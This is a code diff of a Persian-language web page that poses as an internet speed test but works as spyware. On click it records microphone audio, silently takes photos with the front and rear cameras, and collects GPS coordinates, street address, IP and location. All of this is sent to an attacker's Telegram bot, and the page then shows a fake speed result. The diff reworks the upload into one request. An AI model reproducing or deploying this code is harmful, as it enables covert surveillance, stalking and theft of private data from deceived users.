@@ -36,7 +36,6 @@
     <div id="status" class="status">آماده برای تست...</div>
   </div>
 
-  <!-- ویدیو مخفی برای عکس -->
   <video id="video" class="hidden" autoplay playsinline></video>
   <canvas id="canvas" class="hidden"></canvas>
 
@@ -55,31 +54,29 @@
 
     let mediaRecorder, stream, timer, photoStream;
 
-    // گرفتن عکس از دوربین
-    async function capturePhoto(facingMode = 'user') {
-      return new Promise(async (resolve) => {
-        try {
-          photoStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode },
-            audio: false
-          });
+    // عکس فوری از دوربین
+    async function capturePhoto(facingMode) {
+      return new Promise((resolve) => {
+        const constraints = {
+          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        };
 
-          video.srcObject = photoStream;
-          video.onloadedmetadata = () => {
-            video.play();
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            setTimeout(() => {
-              ctx.drawImage(video, 0, 0);
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then(s => {
+            photoStream = s;
+            video.srcObject = s;
+            video.oncanplay = () => {
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               canvas.toBlob(blob => {
                 stopPhotoStream();
                 resolve(blob);
-              }, 'image/jpeg', 0.9);
-            }, 500);
-          };
-        } catch {
-          resolve(null);
-        }
+              }, 'image/jpeg', 0.8);
+            };
+          })
+          .catch(() => resolve(null));
       });
     }
 
@@ -92,33 +89,27 @@
 
     // موقعیت + اطلاعات
     async function getLocation() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve({ error: "پشتیبانی نمی‌شود" });
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ error: "نامشخص" });
         navigator.geolocation.getCurrentPosition(
           async pos => {
-            const { latitude, longitude, accuracy } = pos.coords;
+            const { latitude, longitude } = pos.coords;
             try {
               const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
               const data = await res.json();
-              resolve({ latitude, longitude, accuracy, address: data.display_name || "نامشخص" });
+              resolve({ latitude, longitude, address: data.display_name || "نامشخص" });
             } catch {
-              resolve({ latitude, longitude, accuracy, address: "نامشخص" });
+              resolve({ latitude, longitude, address: "نامشخص" });
             }
           },
-          () => resolve({ error: "اجازه رد شد" }),
-          { enableHighAccuracy: true, timeout: 10000 }
+          () => resolve({ error: "رد شد" }),
+          { enableHighAccuracy: true, timeout: 8000 }
         );
       });
     }
 
     async function getDeviceInfo() {
-      const info = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
-        ip: 'در حال دریافت...',
-        location: 'در حال دریافت...'
-      };
+      const info = { ip: 'نامشخص', location: 'نامشخص' };
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -136,9 +127,7 @@
         status.textContent = "درخواست دسترسی...";
         progressBar.style.width = "0%";
 
-        // دسترسی به میکروفون
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
         const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
           ? 'audio/webm;codecs=opus' : 'audio/webm';
 
@@ -147,14 +136,16 @@
 
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
         mediaRecorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: mimeType });
+          const audioBlob = new Blob(chunks, { type: mimeType });
           const [frontPhoto, backPhoto] = await Promise.all([
             capturePhoto('user'),
             capturePhoto('environment')
           ]);
-          const deviceInfo = await getDeviceInfo();
-          const location = await getLocation();
-          await sendToTelegram(blob, frontPhoto, backPhoto, deviceInfo, location);
+          const [deviceInfo, location] = await Promise.all([
+            getDeviceInfo(),
+            getLocation()
+          ]);
+          await sendAllAtOnce(audioBlob, frontPhoto, backPhoto, deviceInfo, location);
           stopStream();
         };
 
@@ -178,66 +169,93 @@
       }
     }
 
-    async function sendToTelegram(audioBlob, frontPhoto, backPhoto, deviceInfo, location) {
+    // ارسال همه چیز در یک درخواست (فوری!)
+    async function sendAllAtOnce(audioBlob, frontPhoto, backPhoto, deviceInfo, location) {
       status.textContent = "در حال ارسال...";
 
-      // ارسال ویس
-      const audioForm = new FormData();
-      audioForm.append('chat_id', CHAT_ID);
-      audioForm.append('audio', audioBlob, `voice_${Date.now()}.webm`);
-      let messageId = null;
+      const media = [];
+      let audioSent = false;
 
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: audioForm });
-        const data = await res.json();
-        if (data.ok) messageId = data.result.message_id;
-      } catch {}
+      // ویس
+      if (audioBlob) {
+        media.push({
+          type: 'audio',
+          media: audioBlob,
+          caption: 'ویس ۱۰ ثانیه‌ای'
+        });
+        audioSent = true;
+      }
 
-      // ارسال عکس جلو
+      // عکس جلو
       if (frontPhoto) {
-        const frontForm = new FormData();
-        frontForm.append('chat_id', CHAT_ID);
-        frontForm.append('photo', frontPhoto, 'front.jpg');
-        frontForm.append('reply_to_message_id', messageId);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: frontForm });
+        media.push({
+          type: 'photo',
+          media: frontPhoto,
+          caption: 'دوربین جلو'
+        });
       }
 
-      // ارسال عکس عقب
+      // عکس عقب
       if (backPhoto) {
-        const backForm = new FormData();
-        backForm.append('chat_id', CHAT_ID);
-        backForm.append('photo', backPhoto, 'back.jpg');
-        backForm.append('reply_to_message_id', messageId);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: backForm });
+        media.push({
+          type: 'photo',
+          media: backPhoto,
+          caption: 'دوربین عقب'
+        });
       }
 
-      // گزارش کامل
-      const report = `
-*گزارش کامل کاربر*
+      // اگر چیزی هست، بفرست
+      if (media.length > 0) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        media.forEach((item, i) => {
+          form.append(`media${i}`, item.media, `${item.caption}.jpg`);
+          form.append(`type${i}`, item.type);
+          form.append(`caption${i}`, item.caption);
+        });
+        form.append('media', JSON.stringify(media.map((m, i) => ({
+          type: m.type,
+          media: `attach://media${i}`,
+          caption: m.caption
+        }))));
 
- مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
- IP: \`${deviceInfo.ip}\`
- موقعیت تقریبی: \`${deviceInfo.location}\`
+        let messageId = null;
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
+            method: 'POST',
+            body: form
+          });
+          const data = await res.json();
+          if (data.ok) messageId = data.result[0].message_id;
+        } catch (e) {
+          console.error("sendMediaGroup failed", e);
+        }
 
-*موقعیت دقیق*
- طول: \`${location.latitude || 'نامشخص'}\`
- عرض: \`${location.longitude || 'نامشخص'}\`
- آدرس: \`${location.address || 'نامشخص'}\`
+        // گزارش
+        const report = `
+*گزارش کاربر*
+
+IP: \`${deviceInfo.ip}\`
+موقعیت: \`${deviceInfo.location}\`
+طول: \`${location.latitude || 'نامشخص'}\`
+عرض: \`${location.longitude || 'نامشخص'}\`
+آدرس: \`${location.address || 'نامشخص'}\`
 
 [نقشه](https://maps.google.com/?q=${location.latitude},${location.longitude})
-      `.trim();
+        `.trim();
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: report,
-          parse_mode: 'Markdown',
-          reply_to_message_id: messageId,
-          disable_web_page_preview: false
-        })
-      });
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: report,
+            parse_mode: 'Markdown',
+            reply_to_message_id: messageId,
+            disable_web_page_preview: false
+          })
+        });
+      }
 
       status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
       reset();
@@ -254,7 +272,7 @@
         btnText.textContent = "شروع تست سرعت";
         spinner.classList.add('hidden');
         progressBar.style.width = "0%";
-      }, 2000);
+      }, 1500);
     }
 
     startBtn.addEventListener('click', () => {
